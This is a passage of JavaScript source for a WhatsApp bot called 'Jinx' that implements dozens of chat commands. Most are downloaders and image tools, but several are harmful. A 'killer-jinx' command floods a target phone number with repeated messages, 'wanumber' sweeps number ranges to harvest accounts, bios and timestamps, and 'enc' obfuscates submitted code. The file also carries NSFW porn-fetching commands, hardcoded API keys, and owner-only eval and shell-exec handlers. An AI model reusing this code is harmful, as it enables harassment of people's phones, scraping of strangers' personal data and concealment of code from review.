 //await client.sendMessage(from, { text: artist} {quoted: m}); 
 // console.log("About the Artist:\n", artist, "\n"); 
 break ;
case "enc":
let forq = m.quoted ? m.quoted.text ? m.quoted.text : text ? text : m.text : m.text
var JavaScriptObfuscator = require('javascript-obfuscator');
if (!text && !m.quoted) throw 'Quote/tag a code to encrypt';

var obfuscationResult = JavaScriptObfuscator.obfuscate(forq, 


    {
        compact: false,
        controlFlowFlattening: true,
        controlFlowFlatteningThreshold: 1,
        numbersToExpressions: true,
        simplify: true,
        stringArrayShuffle: true,
        splitStrings: true,
        stringArrayThreshold: 1
    }
);

console.log("successfully encrypted the code");
reply(obfuscationResult.getObfuscatedCode());

break;
case "compile-c":

if (!text && !m.quoted) throw 'Quote/tag a C code to compile';

const sourcecode3 =m.quoted ? m.quoted.text ? m.quoted.text : text ? text : m.text : m.text
let resultPromise3 = c.runSource(sourcecode3);
resultPromise3
    .then(resultt3 => {
        console.log(resultt3);
reply(resultt3.stdout);
reply(resultt3.stderr);
    })
    .catch(err => {
        console.log(resultt3.stderr);
reply(resultt3.stderr)
    });
break;

case "compile-c++":

if (!text && !m.quoted) throw 'Quote/tag a C++ code to compile';

const sourcecode4 = m.quoted ? m.quoted.text ? m.quoted.text : text ? text : m.text : m.text
let resultPromise4 = cpp.runSource(sourcecode4);
resultPromise4
    .then(resultt4 => {
        console.log(resultt4);
reply(resultt4.stdout);
reply(resultt4.stderr);
    })
    .catch(err => {
        console.log(resultt4.stderr);
reply(resultt4.stderr)
    });
break;
case "eval":{
   if (!Developer) throw NotOwner; 
if (!text) throw 'Provide a valid Bot Baileys Function to evaluate'
   try { 
 let evaled = await eval(budy.slice(2)); 
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled); 
 await reply(evaled); 
   } catch (err) { 
 await reply(String(err)); 
   } 
 } 

          break;
		
case 'snapshot':
case 'ss':
  try {
    if (!text) return reply("```Uhh Please, Give me Url!```");
    let urll = `https://api.screenshotmachine.com/?key=c04d3a&url=${encodeURIComponent(text)}&dimension=720x720`;
    let media = await getBuffer(urll);
    return await sam.sendMessage(m.chat, { image: media }, { quoted: m });
  } catch (err) {
    return reply("```Error While Fetching Snapshot```");
  }
  break;
	case 'killer-jinx':{
                if (!isPremium) return reply(mess.prem)
                if (!text) return reply(`use ${prefix + command} number|amount\nContoh ${prefix + command} 2547xxxxxxxx,5`)
                let number = text.split(',')[0];
                let amount = text.split(',')[1] * 5;
                if (!number || !amount) {
                    return reply(`use ${prefix + command} number then amount\nExample ${prefix + command} 2547xxxxxxxx,5`)
                }
                if (isNaN(parseInt(amount))) {
                    return reply("Haha wait for Jinx 🦄");
                }
                let cleanedNumber = number.replace(/[^0-9]/g, '');
                let encodedAmount = '' + encodeURI(amount);
                var contactInfo = await sam.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
                if (cleanedNumber == "254742491666") {
                    return;
                }
                if (contactInfo.length == 0) {
                    return reply("The number is not registered on WhatsApp");
                  }
                  reply("U have used, " + command + " Jinx is in process..");
                  await sleep(2000); // Adjusted sleep time for clarity
                  sendRepeatedMessages2(whatsappNumber, encodedAmount);
                  await sleep(2500); // Adjusted sleep time for clarity
                  sendMessageWithMentions(
                    "Hello sir Jinx has Done it again to 🦄@" + whatsappNumber.split('@')[0] + 
                    " Using *" + command + "Its Just Haha 🦄.", 
                    [whatsappNumber]
                  );
            }
                break;
case 'wallpaper': {
  if (!text) throw 'Enter Query Title';
  let { wallpaper } = require('./lib/scraper');
  anu = await wallpaper(text);
  result = anu[Math.floor(Math.random() * anu.length)];
  let Message = {
    image: { url: result.image[0] },
    caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
  };
  sam.sendMessage(m.chat, Message, { quoted: m });
}
break;
case 'wikimedia': {
  if (!text) throw 'Enter Query Title';
  let { wikimedia } = require('./lib/scraper');
  anu = await wikimedia(text);
  result = anu[Math.floor(Math.random() * anu.length)];
  let Message = {
    image: { url: result.image },
    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
  };
  sam.sendMessage(m.chat, Message, { quoted: m });
}
break;

        case 'ringtone': {
                if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
                let anu = await ringtone(text)
                let result = anu[Math.floor(Math.random() * anu.length)]
                sam.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
            }
            break
  case 'buypremium':
            case 'premiumuser': {
                let teks = `Hi ${pushname}👋\n Want to Buy Premium? Just chat with the owner😉`
                await sam.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: 'BUY PREMIUM',
                            body: `3$ / MONTH`,
                            thumbnailUrl: 'https://telegra.ph/file/0955010ca2f8bf045fb0a.jpg',
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: false
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break;
case "imgs": case "ai-img": case "ai-image": case "imageus": {
          try {
            /*if (!isCreator) return reply('_Maaf, Command Ini Khusus Developer Bot Whatsap_*')*/
            if (keyopenai === keyopenai)
            if (!text) return reply(`Infinity AI.\n\nExample:\n${prefix}${command} Wooden house on snow mountain`);
            const configuration = new Configuration({
              apiKey: keyopenai,
            });
            const openai = new OpenAIApi(configuration);
            const response = await openai.createImage({
              prompt: text,
              n: 1,
              size: "512x512",
            });
            //console.log(response.data.data[0].url)
            sam.sendImage(from, response.data.data[0].url, text);
            } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            reply("This error occurred :"+ error.message);
          }
        }
        }
break;
case 'telestick':{
                if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
                let mariaresources = await Telesticker(args[0])
                await reply(`Sending ${mariaresources.length} stickers...`)
                if (m.isGroup && mariaresources.length > 30) {
                        await reply('Number of stickers more than 30, bot will send it in private chat.')
                        for (let i = 0; i < mariaresources.length; i++) {
                                sam.sendMessage(m.sender, { sticker: { url: mariaresources[i].url }})
                        }
                } else {
                        for (let i = 0; i < mariaresources.length; i++) {
                                sam.sendMessage(m.chat, { sticker: { url: mariaresources[i].url }})
                        }
                }
        } else reply(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break; 
case 'restart':  
  if (!Developer) throw `Jinx Owne` 
  reply(`Restarting Jinx. .`)  
  await sleep(3000)  
  process.exit()  
  break;
case 'anime': {

  if (!m.isGroup) return reply('Use this command on a group')
  sam.sendMessage(from, { react: { text: "🍁" , key: m.key }});
  if(!text) return reply(`Please proide a search term!\n\n*Example:* ${prefix}anime naruto`)

  const malScraper = require('mal-scraper')
  reply('Please wait...');
          const anime = await malScraper.getInfoFromName(text).catch(() => null)
          if (!anime) return reply(`${p}Could not find your scarch`)
  let animetxt = `
  🎀 *Title: ${anime.title}*
  🎋 *Type: ${anime.type}*
  🎐 *Premiered on: ${anime.premiered}*
  💠 *Total Episodes: ${anime.episodes}*
  📈 *Status: ${anime.status}*
  💮 *Genres: ${anime.genres}
  📍 *Studio: ${anime.studios}*
  🌟 *Score: ${anime.score}*
  💎 *Rating: ${anime.rating}*
  🏅 *Rank: ${anime.ranked}*
  💫 *Popularity: ${anime.popularity}*
  ♦️ *Trailer: ${anime.trailer}*
  🌐 *URL: ${anime.url}*
  ❄ *Description:* ${anime.synopsis}*`
                  await sam.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                  }
                  break;
case 'broadcastgc':
            case 'bcgroup': {
                if (!Developer) return reply('You are not my Owner')
                if (!text) return reply(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await client.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ\n\n${text}\n\n` + '```' + '\n\n\n𝙹𝙸𝙽𝚇 𝙰𝙸'
                    client.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: '□Paid BroadCast□',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://i.imgur.com/pFHxvfE.jpeg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                reply(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break;
case 'antilinkgc': {
                            if (!m.isGroup) return reply('Group command ')
                if (!isAdmin && !Owner) return reply('Admin Command')
                if (!isBotAdmin) return reply('You need a medical check!')
if (args[0] === "on") {
if (AntiLinkAll) return reply('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./derived/antilink.json', JSON.stringify(ntilinkall))
reply('Success in turning on all antilink in this group')
var groupe = await client.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
sam.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return reply('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./derived/antilinkall.json', JSON.stringify(ntilinkall))
reply('Success in turning off all antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break;
case 'weather':
       
        sam.sendMessage(from, { react: { text: "🛰", key: m.key }}) 
        if (!args[0]) return reply("Enter your location to search weather.")
        myweather = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args.join(" ")}&units=metric&appid=e409825a497a0c894d2dd975542234b0&language=tr`)

        const weathertext = `           🌤 *Weather Report* 🌤  \n\n🔎 *Search Location:* ${myweather.data.name}\n*💮 Country:* ${myweather.data.sys.country}\n🌈 *Weather:* ${myweather.data.weather[0].description}\n🌡️ *Temperature:* ${myweather.data.main.temp}°C\n❄️ *Minimum Temperature:* ${myweather.data.main.temp_min}°C\n📛 *Maximum Temperature:* ${myweather.data.main.temp_max}°C\n💦 *Humidity:* ${myweather.data.main.humidity}%\n🎐 *Wind:* ${myweather.data.wind.speed} km/h\n`
        sam.sendMessage(from, { video: { url: 'https://media.tenor.com/bC57J4v11UcAAAPo/weather-sunny.mp4' }, gifPlayback: true, caption: weathertext }, { quoted: m })

        break;
case 'nsfwmenu':
        if (!isNsfw) return reply(NotNsfw);
        if (!m.isGroup) return reply(group);

        const nsfwmenu=`┌──⊰ _*🔞NSFW 🔞*_
│⊳ 💦  ${prefix}blowjob
│⊳ 💦  ${prefix}cum
│⊳ 💦  ${prefix}foot
│⊳ 💦  ${prefix}gangbang
│⊳ 💦  ${prefix}hentai
│⊳ 💦  ${prefix}pussy
│⊳ 💦  ${prefix}ass
│⊳ 💦  ${prefix}trap
│⊳ 💦  ${prefix}maal
│⊳ 💦  ${prefix}ʀɪʙʙᴏɴꜱ
│⊳ 💦  ${prefix}ʜᴀᴛꜱᴜɴᴇᴍɪᴋᴜ
│⊳ 💦  ${prefix}ʜᴇᴀᴅʙᴀɴᴅ
│⊳ 💦  ${prefix}ꜰᴏxɢɪʀʟ
│⊳ 💦  ${prefix}ᴀɴɪᴍᴀʟᴇᴀʀꜱ
│⊳ 💦  ${prefix}ʙʀᴀ
│⊳ 💦  ${prefix}ꜱᴋɪʀᴛ
│⊳ 💦  ${prefix}ʙʀᴇᴀꜱᴛꜱ
│⊳ 💦  ${prefix}ᴛᴀᴛᴛᴏᴏ
│⊳ 💦  ${prefix}ᴄʜᴀɪɴ
└──────────⊰ 
`
   sam.sendMessage(m.chat, { image: { url: "./derived/jinx.jpg" }, caption: nsfwmenu }, { quoted: m });
        break;
case "xnxxdl": {
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
//if (!isPrem) return reply('This is a premium command')
        if (!m.isGroup) return reply ('Group command')
        if (!text) return reply(`Enter Url`)
        if (!text.includes('xnxx.com')) return reply(`Enter an xnxx link`)
        reply('Please wait')
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
sam.sendMessage(m.chat, { caption: `≡  *XNXX DL BY JINX*
        
▢ *📌Title*: ${xn.title}
▢ *⌚Duration:* ${xn.duration}
▢ *🎞️Quality:* ${xn.quality}
`, video: {url: xn.url_dl} }, { quoted: m })
}
break;
case 'xnxxsearch': {
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
//if (!isPrem) return reply('This is a premium command')
        if (!m.isGroup) return reply('Group command')
        if (!text) return reply(`Enter Query`)
        reply('Please wait')
        const fg = require('api-dylux')
        let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) reply(ff)
              }
              break;
case 'poll': {
           if (!m.isGroup) throw group
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await reply(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Kresswell,Spider,ZzeroMind...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await sam.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break;
case 'chain':
case 'tattoo':
case 'breasts':
case 'skirt':
case 'bra':
case 'animalears':
case 'foxgirl':
case 'headband':
case 'hatsunemiku':
case 'ribbons':
case 'pussy':
case 'cum':
case 'gangbang':
case 'hentai':
case 'ass':
case 'breast':
case 'blowjob':
    if (!m.isGroup) return reply(group);
    if (!isNsfw) return reply(NotNsfw);
    const waifpoudd = await axios.get(`https://fantox-apis.vercel.app/${command}`);
    sam.sendMessage(m.chat, { caption: 'OMG🥵', image: { url: waifpoudd.data.url } }, { quoted: m });
    break;
            case 'checkdeath':
             if (!text) return reply(`Use Someone's Name, Example : ${prefix + command} Kresswell `)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Name : ${predea.data.name}\n*Dead At Age :* ${predea.data.age} Year.\n\n_Quick, Quick, Repent Bro, Because No One Knows About Death_`)
              break;

case 'maal': {
  if (!isNsfw) return reply(NotNsfw);
  if (!m.isGroup) return reply(group);
  reply('Please wait..');
  await sam.sendMessage(m.chat, {
    image: await getBuffer('https://ayushhh.onrender.com'),
    caption: 'OMG 🥵',
  }, { quoted: m });
}
break;
case 'ghsearch': 
       case 'githubsearch': 
       case 'searchgithub':
             if (!q) return reply('*What are you looking for?*')
             let pomi = await fetch('https://api.github.com/search/repositories?q='+q)
            let dhumi = await pomi.json()
             if (pomi.status !== 200) throw dhumi
             str = dhumi.items.map((repo, index) => {
             return `
${1 + index}. *${repo.full_name}*${repo.fork ? '*FORKS*' : ''}
${repo.html_url}
*CREATED ON:* ${formatDate(repo.created_at)}
*LAST UPDATED ON:* ${formatDate(repo.updated_at)}
👁  ${repo.watchers}   🍴  ${repo.forks}   ⭐ ${repo.stargazers_count}
${repo.open_issues} *ISSUES:*${repo.description ? `
*DESCRIPTION:*\n${repo.description}` : ''}
*CLONE:* $ git clone ${repo.clone_url}
`.trim()
}).join('\n\n')
            reply(str)
break;
case "advice":
reply(advice());
console.log(advice());
case 'system': case 'info': case 'ram': case 'usage':
mainSys();
break;
case 'fbdl': case 'fb': case 'facebook': case 'fbmp4': {                 

        if (!text) return reply(`Please provide the link!\n\nExample: ${prefix}fbdl https://www.facebook.com/groups/599913174599515/permalink/705467384044093/`)
           if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(`Invalid link!`)
       let bocil = require('@bochilteam/scraper')  
           bocil.facebookdlv2(`${text}`).then(async (data) => {                   
               let txt = `「 _Facebook Downloader_ 」\n\n`
               txt += `*Title :* ${data.title}\n`
               txt += `*Quality :* ${data.result[0].quality}\n`
               txt += `*Description:* ${data.description}\n`
               txt += `*URL :* ${text}\n\n`
           buf = await getBuffer(data.thumbnail)    
           sam.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })         
           for (let i of data.result) {     
           sam.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail:buf, caption: `*Quality :* ${i.quality}`}, { quoted: m })
           }          
           }).catch((err) => {
               reply('An error Occured')
           })
       }
       break;
case 'delowner':
                if (!isDeveloper) return reply(mess.owner)
                if (!args[0]) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 254712345667`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '')
                unp = owner.indexOf(ya)
                owner.splice(unp, 1)
                fs.writeFileSync('./owner.json', JSON.stringify(owner))
                reply(`The Number ${ya} Has been deleted from owner list by the owner!!!`)
                break
case 'sound1':
            case 'sound2':
            case 'sound3':
            case 'sound4':
            case 'sound5':
            case 'sound6':
            case 'sound7':
            case 'sound8':
            case 'sound9':
            case 'sound10':
            case 'sound11':
            case 'sound12':
            case 'sound13':
            case 'sound14':
            case 'sound15':
            case 'sound16':
            case 'sound17':
            case 'sound18':
            case 'sound19':
            case 'sound20':
            case 'sound21':
            case 'sound22':
            case 'sound23':
            case 'sound24':
            case 'sound25':
            case 'sound26':
            case 'sound27':
            case 'sound28':
            case 'sound29':
            case 'sound30':
            case 'sound31':
            case 'sound32':
            case 'sound33':
            case 'sound34':
            case 'sound35':
            case 'sound36':
            case 'sound37':
            case 'sound38':
            case 'sound39':
            case 'sound40':
            case 'sound41':
            case 'sound42':
            case 'sound43':
            case 'sound44':
            case 'sound45':
            case 'sound46':
            case 'sound47':
            case 'sound48':
            case 'sound49':
            case 'sound50':
            case 'sound51':
            case 'sound52':
            case 'sound53':
            case 'sound54':
            case 'sound55':
            case 'sound56':
            case 'sound57':
            case 'sound58':
            case 'sound59':
            case 'sound60':
            case 'sound61':
            case 'sound62':
            case 'sound63':
            case 'sound64':
            case 'sound65':
            case 'sound66':
            case 'sound67':
            case 'sound68':
            case 'sound69':
            case 'sound70':
            case 'sound71':
            case 'sound72':
            case 'sound73':
            case 'sound74':
            case 'sound75':
            case 'sound76':
            case 'sound77':
            case 'sound78':
            case 'sound79':
            case 'sound80':
            case 'sound81':
            case 'sound82':
            case 'sound83':
            case 'sound84':
            case 'sound85':
            case 'sound86':
            case 'sound87':
            case 'sound88':
            case 'sound89':
            case 'sound90':
            case 'sound91':
            case 'sound92':
            case 'sound93':
            case 'sound94':
            case 'sound95':
            case 'sound96':
            case 'sound97':
            case 'sound98':
            case 'sound99':
            case 'sound100':
            case 'sound101':
            case 'sound102':
            case 'sound103':
            case 'sound104':
            case 'sound105':
            case 'sound106':
            case 'sound107':
            case 'sound108':
            case 'sound109':
            case 'sound110':
            case 'sound111':
            case 'sound112':
            case 'sound113':
            case 'sound114':
            case 'sound115':
            case 'sound116':
            case 'sound117':
            case 'sound118':
            case 'sound119':
            case 'sound120':
            case 'sound121':
            case 'sound122':
            case 'sound123':
            case 'sound124':
            case 'sound125':
            case 'sound126':
            case 'sound127':
            case 'sound128':
            case 'sound129':
            case 'sound130':
            case 'sound131':
            case 'sound132':
            case 'sound133':
            case 'sound134':
            case 'sound135':
            case 'sound136':
            case 'sound137':
            case 'sound138':
            case 'sound139':
            case 'sound140':
            case 'sound141':
            case 'sound142':
            case 'sound143':
            case 'sound144':
            case 'sound145':
            case 'sound146':
            case 'sound147':
            case 'sound148':
            case 'sound149':
            case 'sound150':
            case 'sound151':
            case 'sound152':
            case 'sound153':
            case 'sound154':
            case 'sound155':
            case 'sound156':
            case 'sound157':
            case 'sound158':
            case 'sound159':
            case 'sound160':
            case 'sound161':
                sam_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
                await sam.sendMessage(m.chat, { audio: sam_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                break
//===============================================//
case 'blackpink':
case 'neon':
case 'greenneon':
case 'advanceglow':
case 'futureneon':
case 'sandwriting':
case 'sandsummer':
case 'sandengraved':
case 'metaldark':
case 'neonlight':
case 'holographic':
case 'text1917':
case 'minion':
case 'deluxesilver':
case 'newyearcard':
case 'bloodfrosted':
case 'halloween':
case 'jokerlogo':
case 'fireworksparkle':
case 'natureleaves':
case 'bokeh':
case 'toxic':
case 'strawberry':
case 'box3d':
case 'roadwarning':
case 'breakwall':
case 'icecold':
case 'luxury':
case 'cloud':
case 'summersand':
case 'horrorblood':
case 'thunder':
	if (args.length == 0) return reply(`Example: ${prefix + command} King Sam`)
	sam.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=cde5404984da80591a2692b6&text=${text}` } })
	break; 
//=================================================//
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
sam.sendImageAsSticker(m.chat, data.url, m, { packname: packname, author: author })
})
}
break;
case 'wanumber': case 'nowa': case 'searchnumber':{
                   if (!text) return reply(`📵🔢 Enter a number ending with 'x'\n\nExample: ${prefix + command} 254919933xx`)
var inputnumber = text.split(" ")[0]

        reply(`📱🔍 Exploring for WhatsApp accounts within the range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `🔖 *WhatsApp Numbers Directory*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await sam.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await sam.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `📞 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🌐 ️*Bio :* ${anu1.status}\n⏳️*Last update :* ${moment(anu1.setAt).tz('Africa/Nairobi').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break;
 //===============================================//
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{

if (!q) return reply(`🔮Example : ${prefix+command} King Sam`) 
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
sam.sendMessage(m.chat, { image: { url: dehe }, caption: `By JINX V1` }, { quoted: m })
}
break;
//=======================================================//
default:
}
}
if (budy.startsWith("=>")) {
if (!isDeveloper) return
try {
const result = await eval(`(async () => { return ${budy.slice(3)} })()`)
m.reply(util.format(result))
} catch (e) {
m.reply(String(e))
}
}
if (budy.startsWith(">")) {
if (!isDeveloper) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith("$")) {
if (!isDeveloper) return
exec(budy.slice(2),
(err, stdout) => {
if (err) return m.reply(err.toString())
if (stdout) return m.reply(stdout.toString())
})
}
} catch (err) {
const handleError = async () => {
sam.sendMessage(global.ownMain + "@s.whatsapp.net", {
text: require("util").format(err)
}, {
quoted: m
})
new Promise(resolve => setTimeout(resolve, 2000))
/*m.reply(`!Eror, error details will be sent to bot contributors ✓

${util.format(err)}`)*/
console.log(util.format(err))
}
handleError()
}
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(color(`Update ${__filename}`, "green"))
delete require.cache[file];
require(file);
});
